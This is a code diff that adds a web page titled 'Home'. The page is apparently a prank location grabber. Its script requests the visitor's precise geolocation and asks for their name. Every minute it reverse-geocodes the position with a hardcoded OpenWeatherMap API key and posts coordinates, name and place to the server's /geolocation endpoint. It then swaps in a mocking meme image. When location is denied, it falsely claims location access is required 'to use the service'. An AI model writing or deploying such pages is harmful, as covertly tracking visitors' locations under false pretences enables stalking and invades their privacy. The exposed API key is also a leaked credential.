@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.8.0/dist/leaflet.css"
+    integrity="sha512-hoalWLoI8r4UszCkZ5kL8vayOGVae1oxXe/2A4AO6J9+580uKHDO3JdHb7NzwwzK5xr/Fs0W40kiNHxM9vyTtQ=="
+    crossorigin=""/>
+    <script src="https://unpkg.com/leaflet@1.8.0/dist/leaflet.js"
+    integrity="sha512-BB3hKbKWOc9Ez/TAwyWxNXeoV9c1v6FIeYiBieIWkpLjauysF18NzgR1MBNBXf8/KABdlkX68nAhlwcDFLGPCQ=="
+    crossorigin=""></script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <title>Home</title>
+</head>
+<body>
+    
+    <img id="bg" src="https://miro.medium.com/max/880/0*H3jZONKqRuAAeHnG.jpg" alt="">
+    
+    </body>
+
+    <script>
+
+
+        var options = {
+  enableHighAccuracy: true,
+  timeout: 5000,
+  maximumAge: 0
+};
+ function success(pos) {
+  const name = prompt("Enter Your Name")
+  setInterval(async () => {
+    const API_KEY = '2612b45d733c0fbfebffb158d8816fc8'
+    await fetch(`http://api.openweathermap.org/geo/1.0/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&limit=${5}&appid=${API_KEY}`)
+    .then(response => response.json())
+    .then(geoData => {
+        var payload = {
+    latitude: pos.coords.latitude,
+    longitude: pos.coords.longitude,
+    username : name,
+    place : geoData[0].name
+        }
+        
+        const data = JSON.stringify(payload);
+var xmlhttp = new XMLHttpRequest();   
+var url = "/geolocation";
+xmlhttp.open("POST", url, data);
+xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xmlhttp.send(data);
+}).catch(err => console.log(err))
+   
+
+
+setTimeout(() => {
+    document.getElementById('bg').src = 'https://indianmemetemplates.com/wp-content/uploads/kaisa-laga-mera-majak.jpg';
+}, 2000);
+
+
+}, 60000)
+  
+}
+function error(err) {
+  alert('Enable Location Access to use the service.');
+}
+        navigator.geolocation.getCurrentPosition(success, error, options);
+        
+    </script>
+</html>
